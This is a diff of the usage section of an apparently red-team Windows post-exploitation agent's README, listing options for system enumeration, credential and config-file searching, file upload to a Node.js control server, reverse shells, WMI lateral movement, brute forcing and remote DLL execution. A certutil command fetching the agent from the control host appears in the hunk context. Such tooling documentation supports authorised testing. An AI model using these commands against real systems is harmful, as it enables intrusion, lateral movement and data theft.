@@ -77,20 +77,22 @@ certutil.exe -urlcache -split -f "http://nodejsip:4000/release/x64.exe" agent.ex
 ```
 -s --retrieve windows services and installed drivers.
 -u --retrieve information about Users, groups, roles.
--c --search for senstive config files by extension.
+-c --search connected drivers for senstive config files by extension.
 -n --retrieve network information,network interfaces, connection details.
 -w --enumerate for writeable directories, access permission Check, modified permissions.
--i --enumerate windows system information, Sessions, log information.
+-i --enumerate windows system information, Sessions, Always elvated check.
 -l --search in any file for specific string , ex : agent.exe -l c:\ password *.config.
--o --specify host address of nodejs application.
--p --enumerate installed Softwares, Running Processes, Tasks .
+-o --specify host address of nodejs application , you can use srvhost also
+-p --enumerate installed Softwares, Running Processes, Tasks.
 -e --kernel inspection Tool, it will help to search through tool databases for windows kernel vulnerabilities
 -x --password to authorize your connection with node js application.
--d --download Files directly into Target Machine .
+-d --download Files directly into target machine.
 -t --upload Files From target machine into node js application.
--m --run all known scan Types together .
+-m --run all known scan Types together.
 
--r --spawn a reverse shell with specific account(weaponization of run-as-user windows api function).
+[!] RED TEAMING TACTICS SECTION
+
+-r --spawn a reverse shell with specific account.
 -lr --Lateral movement technique using WMI (e.g -lr -host 192.168.14.1 -username administrator -password blabla -srvhost nodejsip )
 -nds --network discovery and share enumeration
 -cmd --transfer commands via HTTP Shell
@@ -98,7 +100,10 @@ certutil.exe -urlcache -split -f "http://nodejsip:4000/release/x64.exe" agent.ex
 -username --identity authentication for specific attack modules.
 -password --identity authentication for specific attack modules.
 -host --identify remote host to conduct an attack to.
--srvhost --set rhost of node js application.(bidirectional communications).
+-srvhost --set rhost of node js application.
+-bf --local users / domain users bruteforce module
+-import --import and execute dll file locally
+-remote --import and execute dll file from remote host
 ```
 ### Documentations
 https://0xsp.com/security%20dev/0xsp-mongoose-red
